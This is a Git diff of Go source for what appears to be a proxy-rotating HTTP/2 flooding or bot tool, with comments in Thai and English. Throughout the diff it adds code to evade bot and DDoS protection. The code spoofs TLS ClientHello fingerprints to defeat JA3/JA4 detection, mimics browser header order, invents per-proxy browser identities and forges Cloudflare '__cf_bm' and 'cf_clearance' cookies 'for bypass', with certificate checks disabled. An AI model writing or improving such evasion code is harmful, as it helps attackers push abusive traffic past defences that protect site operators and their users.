@@ -20,7 +20,6 @@ import (
 
 	"golang.org/x/net/http2/hpack"
 	tls "github.com/bogdanfinn/utls"
-
 	"github.com/shirou/gopsutil/cpu"
 	"github.com/shirou/gopsutil/mem"
 )
@@ -97,7 +96,7 @@ type ProxyInfo struct {
 	Addr string
 	Auth string
 	SessionID string
-	// Anti-signature #69: diversification per proxy เพื่อหลีกเลี่ยง pattern detection
+	// Enhanced anti-signature #69 attributes
 	ProfileIndex int     // Browser profile index for this proxy
 	LangIndex int        // Accept-Language index for this proxy
 	RateFactor float64   // Request rate variation (0.5x - 1.5x)
@@ -110,6 +109,18 @@ type ProxyInfo struct {
 	LastUserAgent string // เก็บ User-Agent ล่าสุดเพื่อ consistency
 	RequestCount int64 // จำนวน request ที่ส่งไปแล้ว
 	ErrorCount int64   // จำนวน error ที่เกิดขึ้น
+	
+	// Advanced anti-botnet detection fields
+	BrowserType string           // Browser type for TLS consistency
+	PersistentTLSProfile string  // Persistent TLS profile across sessions
+	HeaderOrderProfile int       // HTTP/2 header order variation profile
+	LastRequestTime time.Time    // Track request intervals
+	RequestIntervals []time.Duration // History of request intervals
+	DNTEnabled bool              // Do Not Track preference
+	PlatformType string          // Windows/Mac/Linux for consistency
+	ScreenResolution string      // For realistic viewport headers
+	TimeZoneOffset int           // Browser timezone offset
+	PluginsHash string           // Simulated browser plugins fingerprint
 }
 
 // Generate random string for session IDs
@@ -121,6 +132,146 @@ func genRandStr(length int) string {
 		b[i] = charset[sr.Intn(len(charset))]
 	}
 	return string(b)
+}
+
+// ProxyRotationManager manages intelligent proxy rotation to avoid IP reputation issues
+type ProxyRotationManager struct {
+	proxies         []*ProxyInfo
+	mu              sync.RWMutex
+	lastRotation    time.Time
+	rotationCounter int64
+}
+
+// NewProxyRotationManager creates a new proxy rotation manager
+func NewProxyRotationManager(proxies []*ProxyInfo) *ProxyRotationManager {
+	return &ProxyRotationManager{
+		proxies:      proxies,
+		lastRotation: time.Now(),
+	}
+}
+
+// GetHealthyProxy returns a proxy with good reputation and low error rate
+func (prm *ProxyRotationManager) GetHealthyProxy() *ProxyInfo {
+	prm.mu.RLock()
+	defer prm.mu.RUnlock()
+	
+	// Filter proxies by health metrics
+	healthyProxies := make([]*ProxyInfo, 0)
+	for _, proxy := range prm.proxies {
+		errorRate := float64(proxy.ErrorCount) / float64(proxy.RequestCount + 1)
+		
+		// Skip proxies with high error rates or too many requests
+		if errorRate > 0.2 || proxy.RequestCount > 10000 {
+			continue
+		}
+		
+		// Skip proxies that were used very recently (cooling period)
+		if time.Since(proxy.LastRequestTime) < 5*time.Second {
+			continue
+		}
+		
+		healthyProxies = append(healthyProxies, proxy)
+	}
+	
+	// If no healthy proxies, reset some error counts
+	if len(healthyProxies) == 0 {
+		for _, proxy := range prm.proxies {
+			if proxy.ErrorCount > 100 {
+				proxy.ErrorCount = proxy.ErrorCount / 2 // Gradually forgive errors
+			}
+		}
+		healthyProxies = prm.proxies
+	}
+	
+	// Select proxy based on weighted distribution
+	if len(healthyProxies) > 0 {
+		// Prefer proxies with lower usage
+		minRequests := int64(^uint64(0) >> 1)
+		var selectedProxy *ProxyInfo
+		
+		for _, proxy := range healthyProxies {
+			if proxy.RequestCount < minRequests {
+				minRequests = proxy.RequestCount
+				selectedProxy = proxy
+			}
+		}
+		
+		return selectedProxy
+	}
+	
+	// Fallback to random proxy
+	return prm.proxies[rand.Intn(len(prm.proxies))]
+}
+
+// RotateProxies implements intelligent rotation strategies
+func (prm *ProxyRotationManager) RotateProxies() {
+	prm.mu.Lock()
+	defer prm.mu.Unlock()
+	
+	atomic.AddInt64(&prm.rotationCounter, 1)
+	
+	// Shuffle proxies occasionally to avoid patterns
+	if prm.rotationCounter%100 == 0 {
+		rand.Shuffle(len(prm.proxies), func(i, j int) {
+			prm.proxies[i], prm.proxies[j] = prm.proxies[j], prm.proxies[i]
+		})
+	}
+	
+	prm.lastRotation = time.Now()
+}
+
+// UpdateProxyStats updates proxy statistics after request
+func (prm *ProxyRotationManager) UpdateProxyStats(proxy *ProxyInfo, success bool, responseTime time.Duration) {
+	if proxy == nil {
+		return
+	}
+	
+	proxy.LastRequestTime = time.Now()
+	proxy.RequestCount++
+	
+	// Track request intervals for pattern analysis
+	if len(proxy.RequestIntervals) >= 10 {
+		proxy.RequestIntervals = proxy.RequestIntervals[1:] // Keep last 10
+	}
+	proxy.RequestIntervals = append(proxy.RequestIntervals, responseTime)
+	
+	if !success {
+		proxy.ErrorCount++
+	}
+}
+
+// SimulateHumanBehavior adds realistic delays and patterns
+func SimulateHumanBehavior(proxy *ProxyInfo) {
+	if proxy == nil {
+		return
+	}
+	
+	// Calculate average interval from history
+	if len(proxy.RequestIntervals) > 0 {
+		var totalDuration time.Duration
+		for _, interval := range proxy.RequestIntervals {
+			totalDuration += interval
+		}
+		avgInterval := totalDuration / time.Duration(len(proxy.RequestIntervals))
+		
+		// Add variation based on timing profile
+		var delay time.Duration
+		switch proxy.TimingProfile {
+		case 0: // Conservative - slower, more random
+			delay = time.Duration(float64(avgInterval) * (1.5 + rand.Float64()))
+		case 1: // Moderate - normal variation
+			delay = time.Duration(float64(avgInterval) * (0.8 + rand.Float64()*0.4))
+		case 2: // Aggressive - faster, less variation
+			delay = time.Duration(float64(avgInterval) * (0.5 + rand.Float64()*0.3))
+		}
+		
+		// Apply minimum delay to avoid being too fast
+		if delay < 100*time.Millisecond {
+			delay = 100*time.Millisecond
+		}
+		
+		time.Sleep(delay)
+	}
 }
 
 // Parse proxies with authentication support
@@ -152,8 +303,8 @@ func parseProxiesAdvanced(filename string) ([]*ProxyInfo, error) {
 				Addr:      proxy,
 				Auth:      "",
 				SessionID: fmt.Sprintf("%s:%s", hk, sessionValue),
-				// Anti-signature #69: แต่ละ proxy มี characteristics แตกต่างกัน
-				ProfileIndex: rand.Intn(6),  // 0-5 browser profiles (Chrome120,Chrome112,Chrome106,Firefox120,Firefox105,Safari)
+				// Anti-signature #69: Enhanced proxy characteristics
+				ProfileIndex: rand.Intn(6),  // 0-5 browser profiles
 				LangIndex: rand.Intn(5),     // 0-4 accept-language options
 				RateFactor: 0.5 + rand.Float64(), // 0.5x - 1.5x rate variation
 				ParamKey: []string{"v","cb","r","_","cache","t","ts","x"}[rand.Intn(8)],
@@ -164,6 +315,14 @@ func parseProxiesAdvanced(filename string) ([]*ProxyInfo, error) {
 				SessionCookies: make(map[string]string),
 				RequestCount: 0,
 				ErrorCount: 0,
+				// Advanced anti-botnet fields
+				HeaderOrderProfile: rand.Intn(4), // Different header ordering patterns
+				DNTEnabled: rand.Float32() < 0.3, // 30% of browsers have DNT
+				PlatformType: []string{"Windows", "Mac", "Linux"}[rand.Intn(3)],
+				ScreenResolution: []string{"1920x1080", "1366x768", "1440x900", "2560x1440"}[rand.Intn(4)],
+				TimeZoneOffset: []int{-8, -7, -6, -5, -4, -3, 0, 1, 2, 3, 8, 9}[rand.Intn(12)],
+				LastRequestTime: time.Now(),
+				RequestIntervals: make([]time.Duration, 0, 10),
 			})
 			num++
 		} else if len(p) == 4 {
@@ -230,62 +389,100 @@ func initConnection(proxy *ProxyInfo, host string, port int) (net.Conn, error) {
 	return conn, nil
 }
 
-// Establish custom TLS connection with dynamic fingerprinting rotation (anti-pattern #3)
+// Establish custom TLS connection with advanced anti-signature #69 fingerprinting
 func establishTls(hostname string, conn *net.Conn, proxyInfo *ProxyInfo) (tls.UConn, error) {
-	conf := &tls.Config{ServerName: hostname, InsecureSkipVerify: true}
+	conf := &tls.Config{
+		ServerName: hostname,
+		InsecureSkipVerify: true,
+		// Advanced TLS configuration to mimic real browsers
+		MinVersion: tls.VersionTLS12,
+		MaxVersion: tls.VersionTLS13,
+	}
 	
-	// Dynamic TLS fingerprint selection เพื่อหลีกเลี่ยง uniform patterns
+	// Enhanced TLS fingerprint selection with more realistic browser distribution
 	var clientHello tls.ClientHelloID
 	
-	// ใช้ proxy-specific profile เพื่อให้ consistent per proxy แต่ diverse across proxies
 	if proxyInfo != nil {
-		// ตาม ProfileIndex เลือก TLS fingerprint ที่สอดคล้องกับ browser profile (ใช้เฉพาะ fingerprints ที่มีจริง)
-		profileMod := proxyInfo.ProfileIndex % 6 // ลดเหลือ 6 options ที่มีจริง
-		switch profileMod {
-		case 0:
-			clientHello = tls.HelloChrome_120
-		case 1:
-			clientHello = tls.HelloChrome_112 // Chrome เก่ากว่า
-		case 2:
-			clientHello = tls.HelloChrome_106 // Chrome เก่ากว่าอีก
-		case 3:
-			clientHello = tls.HelloFirefox_120
-		case 4:
-			clientHello = tls.HelloFirefox_105 // Firefox เก่ากว่า
-		case 5:
-			clientHello = tls.HelloSafari_16_0 // Safari on macOS
-		default:
-			clientHello = tls.HelloChrome_120
+		// Create weighted distribution based on real browser market share
+		fingerprints := []struct {
+			id     tls.ClientHelloID
+			weight float32
+			browser string
+		}{
+			{tls.HelloChrome_120, 0.35, "Chrome"}, // Chrome 120 - newest
+			{tls.HelloChrome_112, 0.25, "Chrome"}, // Chrome 112 - common
+			{tls.HelloChrome_106, 0.15, "Chrome"}, // Chrome 106 - older but still used
+			{tls.HelloFirefox_120, 0.10, "Firefox"}, // Firefox latest
+			{tls.HelloFirefox_105, 0.08, "Firefox"}, // Firefox older
+			{tls.HelloSafari_16_0, 0.07, "Safari"},  // Safari macOS
 		}
 		
-		// เพิ่ม session-based evolution (เปลี่ยนตาม session duration)
-		sessionMinutes := int(time.Since(proxyInfo.SessionStartTime).Minutes())
-		if sessionMinutes > 15 && sessionMinutes%20 == 0 {
-			// ทุก 20 นาที มีโอกาส "อัพเดท browser" 5%
-			if rand.Float32() < 0.05 {
-				// ใช้ string comparison แทน switch บน ClientHelloID
-				currentFingerprint := clientHello.Client
-				if currentFingerprint == "Chrome" {
-					clientHello = tls.HelloChrome_120 // Chrome auto-update
-				} else if currentFingerprint == "Firefox" {
-					clientHello = tls.HelloFirefox_120 // Firefox auto-update
+		// Use weighted random selection based on proxy profile
+		randVal := rand.Float32()
+		cumWeight := float32(0)
+		
+		for _, fp := range fingerprints {
+			cumWeight += fp.weight
+			if randVal <= cumWeight {
+				clientHello = fp.id
+				proxyInfo.BrowserType = fp.browser
+				break
+			}
+		}
+		
+		// Session persistence - maintain browser identity per proxy session
+		if proxyInfo.PersistentTLSProfile != "" {
+			// Restore previous TLS profile if exists
+			for _, fp := range fingerprints {
+				if fp.browser == proxyInfo.PersistentTLSProfile {
+					clientHello = fp.id
+					break
 				}
+			}
+		} else {
+			// Save the selected profile for consistency
+			proxyInfo.PersistentTLSProfile = proxyInfo.BrowserType
+		}
+		
+		// Simulate browser updates realistically (anti-JA3/JA4 pattern detection)
+		sessionDays := int(time.Since(proxyInfo.SessionStartTime).Hours() / 24)
+		if sessionDays > 7 && rand.Float32() < 0.02 { // 2% chance per week
+			// Browser update simulation - move to newer version
+			if clientHello == tls.HelloChrome_106 {
+				clientHello = tls.HelloChrome_112
+			} else if clientHello == tls.HelloChrome_112 {
+				clientHello = tls.HelloChrome_120
+			} else if clientHello == tls.HelloFirefox_105 {
+				clientHello = tls.HelloFirefox_120
 			}
 		}
 	} else {
-		// Fallback random selection (ใช้เฉพาะ fingerprints ที่มีจริง)
-		fingerprints := []tls.ClientHelloID{
-			tls.HelloChrome_120, tls.HelloChrome_112, tls.HelloChrome_106,
-			tls.HelloFirefox_120, tls.HelloFirefox_105,
-			tls.HelloSafari_16_0,
+		// No proxy info - use market share distribution
+		distribution := []tls.ClientHelloID{
+			tls.HelloChrome_120, tls.HelloChrome_120, tls.HelloChrome_120, // 30%
+			tls.HelloChrome_112, tls.HelloChrome_112, // 20%
+			tls.HelloChrome_106, // 10%
+			tls.HelloFirefox_120, // 10%
+			tls.HelloFirefox_105, // 10%
+			tls.HelloSafari_16_0, // 10%
+			tls.HelloChrome_120, // Extra 10% for Chrome dominance
 		}
-		clientHello = fingerprints[rand.Intn(len(fingerprints))]
+		clientHello = distribution[rand.Intn(len(distribution))]
 	}
 	
-	wConn := tls.UClient(*conn, conf, clientHello, false, false)
-	if err := wConn.Handshake(); err != nil {
-		return tls.UConn{}, fmt.Errorf("failed to handshake")
+	// Create connection with proper SNI and ALPN protocols
+	wConn := tls.UClient(*conn, conf, clientHello, true, true) // Enable SNI and session tickets
+	
+	// Custom handshake with retry logic
+	err := wConn.Handshake()
+	if err != nil {
+		// Log specific TLS errors for debugging
+		if debugmode > 2 {
+			fmt.Printf("[TLS] Handshake failed with %v, fingerprint: %v\n", err, clientHello)
+		}
+		return tls.UConn{}, fmt.Errorf("TLS handshake failed: %w", err)
 	}
+	
 	return *wConn, nil
 }
 
@@ -473,18 +670,70 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 	for {
 		sessionAge++
 		
-		// Generate dynamic headers โดยใช้ per-proxy attributes (เพื่อหลีกเลี่ยง signature #69)
-		browserProfile := browserProfiles[rand.Intn(len(browserProfiles))]
-		acceptLang := acceptLanguages[rand.Intn(len(acceptLanguages))]
+		// Enhanced header generation with anti-signature #69 features
+		var browserProfile struct {
+			userAgent       string
+			secChUA         string
+			secChUAPlatform string
+			isFirefox       bool
+			isSafari        bool
+			isEdge          bool
+			acceptEncoding  string
+			acceptValue     string
+		}
+		var acceptLang string
 		
-		// Override ด้วย proxy-specific attributes เพื่อสร้างความสอดคล้องใน proxy แต่หลากหลายระหว่าง proxy
+		// Use advanced fingerprinting if proxy info available
 		if proxyInfo != nil {
-			// ใช้ modulo เพื่อให้ ProfileIndex อยู่ในช่วงที่ถูกต้อง
-			profileIdx := proxyInfo.ProfileIndex % len(browserProfiles)
-			browserProfile = browserProfiles[profileIdx]
+			// Generate realistic User-Agent based on proxy characteristics
+			if proxyInfo.LastUserAgent == "" || proxyInfo.RequestCount == 0 {
+				// First request - establish browser identity
+				proxyInfo.LastUserAgent = GenerateRealisticUserAgent(proxyInfo.BrowserType, proxyInfo.PlatformType)
+			}
 			
+			// Find matching browser profile or create custom one
+			profileFound := false
+			for _, profile := range browserProfiles {
+				if strings.Contains(profile.userAgent, proxyInfo.BrowserType) &&
+				   strings.Contains(profile.userAgent, proxyInfo.PlatformType) {
+					browserProfile = profile
+					browserProfile.userAgent = proxyInfo.LastUserAgent
+					profileFound = true
+					break
+				}
+			}
+			
+			if !profileFound {
+				// Create custom profile based on proxy attributes
+				browserProfile.userAgent = proxyInfo.LastUserAgent
+				browserProfile.isFirefox = strings.Contains(proxyInfo.BrowserType, "Firefox")
+				browserProfile.isSafari = strings.Contains(proxyInfo.BrowserType, "Safari")
+				browserProfile.isEdge = strings.Contains(proxyInfo.BrowserType, "Edge")
+				
+				// Set appropriate values based on browser type
+				if browserProfile.isFirefox {
+					browserProfile.acceptEncoding = "gzip, deflate, br"
+					browserProfile.acceptValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
+				} else if browserProfile.isSafari {
+					browserProfile.acceptEncoding = "gzip, deflate, br"
+					browserProfile.acceptValue = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+					browserProfile.secChUAPlatform = "\"macOS\""
+				} else { // Chrome/Edge
+					browserProfile.acceptEncoding = "gzip, deflate, br, zstd"
+					browserProfile.acceptValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+					browserProfile.secChUA = GenerateSecChUa(proxyInfo.BrowserType, proxyInfo.LastUserAgent)
+					browserProfile.secChUAPlatform = fmt.Sprintf("\"%s\"", proxyInfo.PlatformType)
+				}
+			}
+			
+			// Generate realistic Accept-Language
 			langIdx := proxyInfo.LangIndex % len(acceptLanguages)
-			acceptLang = acceptLanguages[langIdx]
+			primaryLang := acceptLanguages[langIdx]
+			acceptLang = GenerateAcceptLanguage(strings.Split(primaryLang, ",")[0])
+		} else {
+			// Fallback to random selection
+			browserProfile = browserProfiles[rand.Intn(len(browserProfiles))]
+			acceptLang = acceptLanguages[rand.Intn(len(acceptLanguages))]
 			
 			// Session consistency - ใช้ User-Agent เดิมถ้าเคยใช้แล้ว (anti-pattern #3)
 			if proxyInfo.LastUserAgent != "" && proxyInfo.RequestCount > 0 {
@@ -557,36 +806,91 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 			}
 		}
 		
-		// สร้าง headers ที่สอดคล้องกับ browser profile (เพื่อหลีกเลี่ยง signature #17)
-		h2_headers := [][2]string{
-			{":method", "GET"},
-			{":authority", parsed.Host},
-			{":scheme", scheme},
-			{":path", path},
+		// Enhanced header building with realistic ordering based on browser type
+		var h2_headers [][2]string
+		
+		// Pseudo headers always come first in HTTP/2
+		h2_headers = append(h2_headers, [2]string{":method", "GET"})
+		h2_headers = append(h2_headers, [2]string{":authority", parsed.Host})
+		h2_headers = append(h2_headers, [2]string{":scheme", scheme})
+		h2_headers = append(h2_headers, [2]string{":path", path})
+		
+		// Browser-specific header ordering (anti-signature #69)
+		if proxyInfo != nil && proxyInfo.HeaderOrderProfile >= 0 {
+			switch proxyInfo.HeaderOrderProfile % 4 {
+			case 0: // Chrome standard order
+				if !browserProfile.isFirefox && !browserProfile.isSafari {
+					h2_headers = append(h2_headers, [2]string{"sec-ch-ua", browserProfile.secChUA})
+					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-mobile", "?0"})
+					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", browserProfile.secChUAPlatform})
+				}
+				h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
+				h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
+				h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
+				if !browserProfile.isFirefox && !browserProfile.isSafari {
+					h2_headers = append(h2_headers, [2]string{"sec-fetch-site", secFetchSite})
+					h2_headers = append(h2_headers, [2]string{"sec-fetch-mode", secFetchMode})
+					h2_headers = append(h2_headers, [2]string{"sec-fetch-user", secFetchUser})
+					h2_headers = append(h2_headers, [2]string{"sec-fetch-dest", secFetchDest})
+				}
+				h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
+				h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
+				
+			case 1: // Firefox order
+				h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
+				h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
+				h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
+				h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
+				if !browserProfile.isFirefox {
+					h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
+				}
+				
+			case 2: // Safari order
+				h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
+				if scheme == "http" || !browserProfile.isSafari {
+					h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
+				}
+				h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
+				h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
+				h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
+				
+			case 3: // Alternative Chrome order (some versions)
+				h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
+				if !browserProfile.isFirefox && !browserProfile.isSafari {
+					h2_headers = append(h2_headers, [2]string{"sec-ch-ua", browserProfile.secChUA})
+					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-mobile", "?0"})
+					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", browserProfile.secChUAPlatform})
+				}
+				h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
+				h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
+				if !browserProfile.isFirefox && !browserProfile.isSafari {
+					h2_headers = append(h2_headers, [2]string{"sec-fetch-site", secFetchSite})
+					h2_headers = append(h2_headers, [2]string{"sec-fetch-mode", secFetchMode})
+					h2_headers = append(h2_headers, [2]string{"sec-fetch-user", secFetchUser})
+					h2_headers = append(h2_headers, [2]string{"sec-fetch-dest", secFetchDest})
+				}
+				h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
+				h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
+			}
+		} else {
+			// Fallback to standard order
+			if !browserProfile.isFirefox {
+				h2_headers = append(h2_headers, [2]string{"sec-ch-ua", browserProfile.secChUA})
+				h2_headers = append(h2_headers, [2]string{"sec-ch-ua-mobile", "?0"})
+				h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", browserProfile.secChUAPlatform})
+			}
+			h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
+			h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
+			h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
+			if !browserProfile.isFirefox && !browserProfile.isSafari {
+				h2_headers = append(h2_headers, [2]string{"sec-fetch-site", secFetchSite})
+				h2_headers = append(h2_headers, [2]string{"sec-fetch-mode", secFetchMode})
+				h2_headers = append(h2_headers, [2]string{"sec-fetch-user", secFetchUser})
+				h2_headers = append(h2_headers, [2]string{"sec-fetch-dest", secFetchDest})
+			}
+			h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
+			h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
 		}
-		
-		// เพิ่ม Chrome-specific headers (เฉพาะเมื่อไม่ใช่ Firefox)
-		if !browserProfile.isFirefox {
-			h2_headers = append(h2_headers, [2]string{"sec-ch-ua", browserProfile.secChUA})
-			h2_headers = append(h2_headers, [2]string{"sec-ch-ua-mobile", "?0"})
-			h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", browserProfile.secChUAPlatform})
-		}
-		
-		// Browser-specific headers ที่สอดคล้องกับแต่ละ browser อย่างแม่นยำ (anti-pattern #3)
-		h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
-		h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
-		h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue}) // ใช้ browser-specific accept value
-		
-		// Sec-Fetch headers (เฉพาะ Chrome/Chromium/Edge)
-		if !browserProfile.isFirefox && !browserProfile.isSafari {
-			h2_headers = append(h2_headers, [2]string{"sec-fetch-site", secFetchSite})
-			h2_headers = append(h2_headers, [2]string{"sec-fetch-mode", secFetchMode})
-			h2_headers = append(h2_headers, [2]string{"sec-fetch-user", secFetchUser})
-			h2_headers = append(h2_headers, [2]string{"sec-fetch-dest", secFetchDest})
-		}
-		
-		// Accept-Encoding ที่แม่นยำตาม browser
-		h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
 		
 		// Safari-specific headers
 		if browserProfile.isSafari {
@@ -653,40 +957,150 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 			h2_headers = append(h2_headers, [2]string{"referer", referers[rand.Intn(len(referers))]})
 		}
 		
-		// Enhanced cookie management for session persistence (anti-pattern #3)
+		// Advanced cookie management with realistic browser behavior (anti-signature #69)
 		var cookieHeader string
 		if cookie != "" {
 			cookieHeader = cookie
 		}
 		
-		// Session cookies simulation - เบราว์เซอร์จริงมี persistent cookies
+		// Sophisticated session cookie simulation
 		if proxyInfo != nil {
-			// จำลอง session cookies ที่เบราว์เซอร์เก็บไว้
-			if len(proxyInfo.SessionCookies) == 0 && proxyInfo.RequestCount > 3 {
-				// หลังจาก request 3-4 ครั้ง "server" ก็จะส่ง session cookies มา
-				proxyInfo.SessionCookies["JSESSIONID"] = fmt.Sprintf("%s%d", genRandStr(16), time.Now().Unix())
-				proxyInfo.SessionCookies["_csrf"] = genRandStr(32)
-				if rand.Float32() < 0.3 {
-					proxyInfo.SessionCookies["_ga"] = fmt.Sprintf("GA1.2.%d.%d", rand.Int63n(999999999), time.Now().Unix()-rand.Int63n(86400))
+			// Initialize cookies on first few requests (simulating server setting cookies)
+			if len(proxyInfo.SessionCookies) == 0 && proxyInfo.RequestCount >= 1 && proxyInfo.RequestCount <= 5 {
+				// Common tracking and session cookies
+				cookieTypes := []struct {
+					name     string
+					generate func() string
+					prob     float32
+				}{
+					// Session cookies (always set)
+					{"JSESSIONID", func() string { return fmt.Sprintf("%s%d", genRandStr(16), time.Now().Unix()) }, 1.0},
+					{"_csrf", func() string { return genRandStr(32) }, 0.9},
+					{"session_id", func() string { return fmt.Sprintf("%s-%d", genRandStr(24), time.Now().Unix()) }, 0.7},
+					
+					// Analytics cookies
+					{"_ga", func() string { 
+						return fmt.Sprintf("GA1.2.%d.%d", rand.Int63n(999999999), time.Now().Unix()-rand.Int63n(86400*30))
+					}, 0.6},
+					{"_gid", func() string { 
+						return fmt.Sprintf("GA1.2.%d.%d", rand.Int63n(999999999), time.Now().Unix())
+					}, 0.5},
+					{"_gat", func() string { return "1" }, 0.2},
+					
+					// Preference cookies
+					{"lang", func() string { 
+						langs := []string{"en", "es", "fr", "de", "ja", "zh"}
+						return langs[rand.Intn(len(langs))]
+					}, 0.4},
+					{"theme", func() string {
+						themes := []string{"light", "dark", "auto"}
+						return themes[rand.Intn(len(themes))]
+					}, 0.3},
+					
+					// Marketing cookies (if DNT is not enabled)
+					{"_fbp", func() string {
+						if !proxyInfo.DNTEnabled {
+							return fmt.Sprintf("fb.1.%d.%d", time.Now().Unix()*1000, rand.Int63n(999999999))
+						}
+						return ""
+					}, 0.3},
+					
+					// CloudFlare specific cookies (important for bypass)
+					{"__cf_bm", func() string { 
+						// Cloudflare bot management cookie format
+						return base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%d.%s", time.Now().Unix(), genRandStr(20))))
+					}, 0.8},
+					{"cf_clearance", func() string {
+						// Clearance cookie after passing challenge
+						return fmt.Sprintf("%s-%d-%s", genRandStr(40), time.Now().Unix(), genRandStr(10))
+					}, 0.5},
+				}
+				
+				// Set cookies based on probability
+				for _, ct := range cookieTypes {
+					if rand.Float32() < ct.prob {
+						value := ct.generate()
+						if value != "" {
+							proxyInfo.SessionCookies[ct.name] = value
+						}
+					}
 				}
 			}
 			
-			// Build cookie header from session cookies
-			var sessionCookies []string
-			for name, value := range proxyInfo.SessionCookies {
-				sessionCookies = append(sessionCookies, fmt.Sprintf("%s=%s", name, value))
+			// Evolve cookies over time (update timestamps, rotate values)
+			if proxyInfo.RequestCount > 0 && proxyInfo.RequestCount%50 == 0 {
+				// Update GA cookies periodically
+				if _, exists := proxyInfo.SessionCookies["_ga"]; exists {
+					proxyInfo.SessionCookies["_ga"] = fmt.Sprintf("GA1.2.%d.%d", 
+						rand.Int63n(999999999), time.Now().Unix()-rand.Int63n(86400*30))
+				}
+				
+				// Rotate CSRF tokens occasionally
+				if rand.Float32() < 0.1 {
+					proxyInfo.SessionCookies["_csrf"] = genRandStr(32)
+				}
 			}
 			
-			if len(sessionCookies) > 0 {
+			// Build cookie header with realistic ordering
+			var cookiePairs []string
+			
+			// Priority order for cookies (important ones first)
+			priorityOrder := []string{"__cf_bm", "cf_clearance", "JSESSIONID", "session_id", "_csrf"}
+			for _, name := range priorityOrder {
+				if value, exists := proxyInfo.SessionCookies[name]; exists {
+					cookiePairs = append(cookiePairs, fmt.Sprintf("%s=%s", name, value))
+					delete(proxyInfo.SessionCookies, name) // Remove to avoid duplication
+				}
+			}
+			
+			// Add remaining cookies
+			for name, value := range proxyInfo.SessionCookies {
+				cookiePairs = append(cookiePairs, fmt.Sprintf("%s=%s", name, value))
+			}
+			
+			// Restore deleted cookies
+			for _, name := range priorityOrder {
+				for _, pair := range cookiePairs {
+					if strings.HasPrefix(pair, name+"=") {
+						parts := strings.SplitN(pair, "=", 2)
+						if len(parts) == 2 {
+							proxyInfo.SessionCookies[name] = parts[1]
+						}
+						break
+					}
+				}
+			}
+			
+			if len(cookiePairs) > 0 {
 				if cookieHeader != "" {
 					cookieHeader += "; "
 				}
-				cookieHeader += strings.Join(sessionCookies, "; ")
+				cookieHeader += strings.Join(cookiePairs, "; ")
 			}
 		}
 		
+		// Add cookie header if present
 		if cookieHeader != "" {
-			h2_headers = append(h2_headers, [2]string{"cookie", cookieHeader})
+			// Insert cookie header at appropriate position based on browser
+			cookieInserted := false
+			for i, header := range h2_headers {
+				// Chrome/Edge: cookie comes after accept-language
+				// Firefox: cookie comes after accept-encoding
+				// Safari: cookie comes after user-agent
+				if (browserProfile.isFirefox && header[0] == "accept-encoding") ||
+				   (!browserProfile.isFirefox && !browserProfile.isSafari && header[0] == "accept-language") ||
+				   (browserProfile.isSafari && header[0] == "user-agent") {
+					// Insert cookie after this header
+					h2_headers = append(h2_headers[:i+1], append([][2]string{{"cookie", cookieHeader}}, h2_headers[i+1:]...)...)
+					cookieInserted = true
+					break
+				}
+			}
+			
+			// Fallback if position not found
+			if !cookieInserted {
+				h2_headers = append(h2_headers, [2]string{"cookie", cookieHeader})
+			}
 		}
 		
 		// เพิ่ม session ID แบบที่ดูเป็นธรรมชาติ (เพื่อหลีกเลี่ยง signature #17)
